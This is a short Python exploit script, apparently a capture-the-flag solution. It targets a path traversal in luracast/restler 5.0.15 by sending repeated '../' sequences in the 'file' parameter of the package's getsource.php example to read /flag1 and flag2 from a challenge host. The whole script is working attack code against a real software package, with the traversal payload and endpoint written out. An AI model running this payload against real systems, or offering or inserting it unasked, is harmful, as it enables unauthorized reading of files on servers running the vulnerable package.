#!/usr/bin/env python3
"""luracast/restler 5.0.15 - path traversal via swapped strpos parameters"""
import re
import sys

import requests


def main():
    if len(sys.argv) != 2:
        print("Usage: exploit.py <challenge-host>", file=sys.stderr)
        return 64
    host = sys.argv[1]
    base = f"http://{host}"

    path = "/vendor/luracast/restler/public/examples/resources/getsource.php"

    # Read /flag1 via path traversal (depth 8 works)
    r = requests.get(f"{base}{path}", params={"file": "../../../../../../flag1"}, timeout=15)
    match = re.search(r"<pre[^>]*>(.*?)</pre>", r.text, re.DOTALL)
    if match:
        flag = match.group(1).strip()
        if flag:
            print(flag)

    # Try to execute /readflag by reading it as PHP (won't work, but try)
    # /readflag is a SUID binary, file_get_contents reads raw bytes
    # But we can try to use it via include
    for depth in range(8, 12):
        payload = "../" * depth + "flag2"
        r2 = requests.get(f"{base}{path}", params={"file": payload}, timeout=15)
        match2 = re.search(r"<pre[^>]*>(.*?)</pre>", r2.text, re.DOTALL)
        if match2 and match2.group(1).strip():
            print(match2.group(1).strip())
            break

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
